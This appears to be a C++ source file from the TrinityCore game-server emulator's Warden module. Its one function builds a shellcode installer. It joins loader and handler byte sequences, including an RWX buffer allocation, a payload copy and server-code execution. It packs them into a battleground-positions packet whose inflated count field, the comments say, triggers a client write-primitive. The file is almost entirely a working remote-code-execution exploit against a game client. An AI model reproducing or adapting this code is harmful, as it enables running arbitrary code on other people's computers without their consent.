/*
 * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "WardenPayloads.h"

namespace WardenPayload
{

void BuildShellcodeInstaller(ByteBuffer& out)
{
    constexpr std::array<uint8, 91> loaderRaw =
        Loader::Prologue +
        Loader::RemoveBgHandler +
        Loader::CheckCachedBuffer +
        Loader::AllocRwxBuffer +
        Loader::CacheBufferPtr +
        Loader::CopyPayload +
        Loader::RegisterHandler +
        Loader::JumpToFinalize;

    constexpr std::array<uint8, 94> handler =
        Handler::WipeStagingArea +
        Handler::SetReturnValue +
        Handler::FinalizeEpilogue +
        Handler::HandlerPrologue +
        Handler::GetCodePointer +
        Handler::CallHelperA +
        Handler::CallHelperB +
        Handler::CallBufferAlloc +
        Handler::CallDispatch +
        Handler::ExecuteServerCode +
        Handler::HandlerEpilogue;

    // Pad the loader to the next 8-byte boundary; zero-fill handles the padding bytes.
    // The chunk count drives the BG-positions count field that triggers the write-primitive.
    constexpr size_t paddedSize = (loaderRaw.size() + 7) & ~size_t(7);
    std::array<uint8, paddedSize> loader{};
    for (size_t i = 0; i < loaderRaw.size(); ++i)
        loader[i] = loaderRaw[i];

    int32 chunkCount = static_cast<int32>(paddedSize);

    out << uint32(0);                                                               // count1: no allied player positions
    out << uint32(Protocol::BgExploitBaseCount + uint32(chunkCount / 8));          // count2: triggers write-primitive

    // Emit chunks in reverse order so the client writes them forward to increasing addresses.
    // Each iteration emits 8 loader bytes then 8 handler bytes (one BG-position entry = 16 bytes).
    while (chunkCount > 0)
    {
        for (int32 i = 0; i < 8; ++i)
        {
            size_t idx = static_cast<size_t>(chunkCount - 8 + i);
            out << loader[idx];
        }
        for (int32 i = 0; i < 8; ++i)
        {
            size_t idx = static_cast<size_t>(chunkCount - 8 + i);
            out << (idx < handler.size() ? handler[idx] : uint8(0));
        }

        chunkCount -= 8;
    }
}

} // namespace WardenPayload
